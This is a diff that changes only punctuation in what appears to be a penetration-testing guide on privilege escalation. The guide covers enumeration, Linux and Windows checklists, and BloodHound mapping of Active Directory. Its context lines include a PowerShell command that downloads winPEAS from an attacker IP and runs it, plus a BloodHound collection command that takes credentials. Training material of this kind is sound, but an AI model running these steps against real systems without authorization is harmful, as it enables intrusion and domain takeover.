@@ -1,6 +1,6 @@
 # Privilege Escalation
 
-The first thing to do after landing a shell is enumerate — not guess. Automated tools like `linpeas` and `winpeas` surface most vectors quickly, but knowing what to look for means you can act on the output rather than just reading it.
+The first thing to do after landing a shell is enumerate, not guess. Automated tools like `linpeas` and `winpeas` surface most vectors quickly, but knowing what to look for means you can act on the output rather than just reading it.
 
 | Section | Common vectors |
 |---|---|
@@ -46,9 +46,9 @@ iwr -uri http://<attacker-ip>/winPEASx64.exe -OutFile C:\Temp\winpeas.exe; .\win
 
 ---
 
-### 3. Linux — Work the Checklist
+### 3. Linux: Work the Checklist
 
-Check in this order — each step is faster than the one before it:
+Check in this order, each step is faster than the one before it:
 
 ```bash
 sudo -l                                        # sudo permissions (most common path)
@@ -63,7 +63,7 @@ See [Local Enumeration](linux/local-enumeration.md), [Cron & SUID](linux/cron-su
 
 ---
 
-### 4. Windows — Work the Checklist
+### 4. Windows: Work the Checklist
 
 ```powershell
 whoami /priv                          # token privileges (SeImpersonate is game over)
@@ -79,9 +79,9 @@ See [Privilege Abuse](windows/privilege-abuse.md), [Service Exploitation](window
 
 ---
 
-### 5. Active Directory — Map the Path First
+### 5. Active Directory: Map the Path First
 
-Don't guess at AD attacks — collect BloodHound data first and let it show you the shortest path to Domain Admin.
+Don't guess at AD attacks, collect BloodHound data first and let it show you the shortest path to Domain Admin.
 
 ```bash
 bloodhound-python -c all -d example.com -u <user> -p '<pass>' -ns 10.10.10.10 --zip
